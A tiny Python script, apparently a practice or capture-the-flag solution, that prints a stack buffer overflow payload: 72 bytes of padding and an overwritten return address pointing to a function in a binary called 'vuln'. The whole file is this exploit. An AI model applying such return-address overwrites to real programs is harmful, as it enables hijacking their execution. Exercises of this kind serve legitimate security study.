import sys
junk = b'A'*72
# Got using readelf -s vuln | grep -i "func"
rip = b'\x96\x11\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(junk + rip)
